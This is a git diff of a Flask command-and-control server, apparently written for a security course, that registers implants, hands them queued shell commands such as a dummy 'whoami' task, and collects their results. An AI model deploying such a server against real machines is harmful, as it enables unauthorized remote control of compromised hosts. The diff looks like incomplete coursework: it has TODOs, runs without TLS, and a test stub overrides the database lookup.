@@ -24,11 +24,7 @@ template_dir = "../client/templates"
 
 
 
-# code snippets from lecture13
 
-CREATED = "CREATED"
-TASKED = 'TASKED'
-DONE = "DONE"
 
 ### set up flask app ###
 
@@ -44,20 +40,20 @@ db = SQLAlchemy(app)
 
 # -----------------------------
 
+# 3 statuses for a task
+CREATED = "CREATED"
+TASKED = 'TASKED'
+DONE = "DONE"
+
 class Task(db.Model): # a SQLAlchemy class
     id = db.Column(db.Integer, primary_key=True) ## a database entity that allows us to index the entries
     # need to specify length of String if using MySQL; Feel free to change the length
     job_id = db.Column(db.String(288))
     command_type = db.Column(db.String(288))
     cmd = db.Column(db.String(4096))
-    Status = db.Column(db.String(288))
-    agent_id = db.Column(db.String(288))
+    status = db.Column(db.String(288))
+    agent_id = db.Column(db.String(288)) ## the agent that is associated with the task
 
-# class Agent(db.Model): # a SQLAlchemy class
-#     id = db.Column(db.Integer, primary_key=True)
-#     agent_id = db.Column(db.String(288))
-#     whoami = db.Column(db.String(288))
-#     password = db.Column(db.String(288))
 
 class Client(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -82,16 +78,37 @@ class Agent(db.Model):
     expected_checkin = db.Column(db.DateTime)    # when should you expect to see the agent again
     #TODO            : a func to generate a new python datatime for expected checkin
 
-
-    
+# class Agent(db.Model): # a SQLAlchemy class
+#     id = db.Column(db.Integer, primary_key=True)
+#     agent_id = db.Column(db.String(288))
+#     whoami = db.Column(db.String(288))
+#     password = db.Column(db.String(288))
 
 # search agent by agent_id
 # link for ref: https://flask-sqlalchemy.palletsprojects.com/en/2.x/queries/
 def find_agent_by_id(id_):
+    """
+        a function that finds an agent in database by its id
+    """
     return Agent.query.filter_by(agent_id=id_).first()
 
+def agent_exist(id_):
+    """
+        a function that checks if an agent exists
+    """
+    return find_agent_by_id(id_) != None
+
 def find_client_by_id(id_):
+    """
+        a function that finds a client in database by its id
+    """
     return Client.query.filter_by(client_id=id_).first()
+
+def find_agent_task(agent_id):
+    """
+        a function that finds a task for an agent
+    """
+    return Task.query.filter_by(agent_id=agent_id).first()
 
 def hash_passoword(password):
     """
@@ -137,10 +154,8 @@ def list_clients():
     client_ids = [i.client_id for i in clients]
     return client_ids
 
-# the following is a route
-# think of this as a subpage
-# e.g. 127.0.0.1/register_agent
-@app.route('/register_agent', methods=["POST"]) # support only POST requests
+
+@app.route('/agent/register', methods=["POST"]) # support only POST requests
 def register_agent(): # --> this is a handler
     """
         listens to the /register_agent route
@@ -165,8 +180,8 @@ def register_agent(): # --> this is a handler
 
     return jsonify({"status": "ok", "message": "Welcome!"})
 
-@app.route('/get_task', methods=['POST'])
-def get_task():
+@app.route('/agent/send_task', methods=['POST'])
+def send_task():
     """
         listens to the /task route
         When an implant asks for a new task, this function will query the database
@@ -175,30 +190,40 @@ def get_task():
         If not, return an empty json (or something else)
     """
     data = request.json ## getting a request from task route
+    if data == None:
+        return jsonify({"status": "error: no data"})
+
     agent_id = data["agent_id"] ## need to verify agent_id 
     password = data["password"] ## and password 
+    if not agent_exist(agent_id):
+        return jsonify({"status": "error: agent not found"})
 
     if verify_agent_password(agent_id, password):
         print(f"[+] agent {agent_id} has nothing to do. Give it a job!")
-        agent = find_agent_by_id(agent_id)
+        task = find_agent_task(agent_id) ## find the task for the agent if there is any
 
-        ### FOR TESTING PURPOSES ###
-        task = {"task": "run_command", "commands": ["whoami", "ping 8.8.8.8"], "status": "ok"} 
-        ### FOR TESTING PURPOSES ###
+        ### A DUMMY CMD FOR TESTING PURPOSES ###
+        task = {"command_type": "test_command", "cmd": ["whoami", "ping 8.8.8.8"], "status": "ok"} 
+        ### COMMENT OUT WHEN TASK MUST BE READ FROM DB ###
+
+        if task == None:
+            return jsonify({"status": "no task for this agent at the moment"})
 
         return jsonify(task)
     else:
         print("[-] the agent has failed to authenticate")
         return jsonify({"status": "authentication failed"})
     
-@app.route('/task_results', methods=['POST'])
-def task_results():
+@app.route('/agent/get_results', methods=['POST'])
+def get_results():
     """
         listens to the /task_results route
         When an implant sends back the results of a task, this function will store the results
         in the database
     """
     data = request.json
+    if data == None:
+        return jsonify({"status": "error: no data"})
     agent_id = data["agent_id"]
     password = data["password"]
     results = data["results"]
@@ -212,11 +237,13 @@ def task_results():
         print("[-] the agent has failed to authenticate")
         return jsonify({"status": "authentication failed"})
 
+
+
 @app.route("/")
 def login():
     return render_template("login.html")
 
-@app.route('/login_client', methods=['POST'])
+@app.route('/client/login', methods=['POST'])
 def login_client():
     """
         listens to the /register_client route
@@ -246,7 +273,7 @@ def login_client():
     
     return ""
 
-@app.route('/dashboard', methods=['GET'])
+@app.route('/client/dashboard', methods=['GET'])
 def dashboard():
     #TODO: display all the info needed
     """
@@ -261,10 +288,38 @@ def dashboard():
     
     return info
 
+@app.route("/tasks/create", methods=["POST"])
+def create_task():
+    data = request.json
+    if data == None:
+        return jsonify({"status": "error: no data"})
+    
+    job_id       = os.urandom(16).hex() ##TODO: generate a random job id (might need to change this later)
+    command_type = data["command_type"]
+    cmd          = data["cmd"]
+    agent_id     = data["agent_id"]
+
+    ## error checking ##
+    ##TODO: check if command type and cmd are valid
+
+    if(not agent_exist(agent_id)):
+        return jsonify({"status": "error: agent does not exist"})
+    
+    task = Task(
+        command_type=command_type,
+        cmd=cmd,
+        agent_id=agent_id,
+    )
+    db.session.add(task)
+    db.session.commit()
+    print(f"[+] a new task has been created for agent {agent_id}")
+    return jsonify({"status": "ok", "job_id": job_id})
+
+
 if __name__ == '__main__':
     # HTTPS uses TLS (SSL) to encrypt normal HTTP requests and responses
     # app.run(ssl_context='adhoc') # run with TLS encryption 
-    app.run()
+    app.run()                      # run without TLS encryption
 
 
 
